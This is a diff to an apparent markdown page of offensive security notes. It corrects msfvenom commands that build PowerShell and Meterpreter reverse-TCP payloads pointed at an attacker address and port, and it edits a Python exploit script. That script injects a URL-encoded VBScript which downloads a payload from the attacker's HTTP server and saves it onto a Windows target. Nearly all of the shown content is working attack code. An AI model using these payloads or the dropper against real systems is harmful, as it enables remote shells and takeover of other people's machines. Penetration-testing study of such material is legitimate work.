@@ -10,13 +10,15 @@
 
 {% code overflow="wrap" %}
 ```sh
-$ msfvenom -p cmd/windows/powershell/powershell_reverse_tcp LHOST=<attakcker_addr> LPORT=8888 -o <output>.cmd
+$ msfvenom -p cmd/windows/powershell/powershell_reverse_tcp LHOST=<attacker_addr> LPORT=8888 -o <output>.cmd
 ```
 {% endcode %}
 
+_**meterpreter**_
+
 {% code overflow="wrap" %}
-```shell
-$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.4.10.179 LPORT=8888 -o <output>.cmd
+```sh
+$ msfvenom -p windows/meterpreter_reverse_tcp -f exe LHOST=10.4.10.179 LPORT=8888 -o <output>.cmd
 ```
 {% endcode %}
 
@@ -62,7 +64,7 @@ try:
 
 	ip_addr = "10.4.10.179" #local IP address
 	local_port = "8888" # Local Port number
-	rev_shell_payload = "rev_windows_meterpreter.cmd"
+	rev_shell_payload = "xxxx"
 
 	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%3A9998%2F"+rev_shell_payload+"%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5C"+rev_shell_payload+"%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
 	save= "save|" + vbs
@@ -82,8 +84,6 @@ except:
 	Don't forgot to change the Local IP address and Port number on the script"""
 	
             
-
-       
 ```
 {% endcode %}
 
